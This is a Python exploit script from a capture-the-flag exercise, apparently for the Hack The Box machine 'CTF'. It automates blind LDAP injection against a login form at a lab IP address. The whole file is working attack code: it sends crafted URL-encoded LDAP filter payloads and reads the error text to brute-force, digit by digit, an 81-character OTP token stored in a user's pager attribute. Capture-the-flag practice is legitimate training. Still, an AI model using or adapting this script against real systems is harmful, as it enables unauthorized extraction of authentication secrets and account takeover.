#!/usr/bin/python3

'''
Write-up : https://0xrick.github.io/hack-the-box/ctf/

Blind LDAP injection exploitation script from Hack The Box - CTF.
Extracts the token used to generate OTPs from the pager attribute. 
'''

import requests
import sys

YELLOW = "\033[93m"
GREEN = "\033[32m"

def send_payload(payload):
	post_data = {"inputUsername":payload,"inputOTP":"0000"}
	req = requests.post("http://10.10.10.122/login.php",data=post_data)
	response = req.text
	return response

def check_response(response):
	if "Cannot login" in response:
		return True
	else:
		return False

def exploit():
	global token
	n_list = [n for n in range(10)]
	for i in n_list:
		payload = "%2A%29%28uid%3D%2A%29%29%28%7C%28pager%3D{}{}%2A".format(token,str(i))
		response = send_payload(payload)
		if check_response(response):
			token+=str(i)

token = ""
print(YELLOW + "[*] Extracting Token")
while len(token) != 81:
	exploit()
	sys.stdout.write("\r" + YELLOW + "[*] Status : " + token)
	sys.stdout.flush()
else :
	print(GREEN + "\n[!] Done !")
	print(GREEN + "[*] Token : " + token)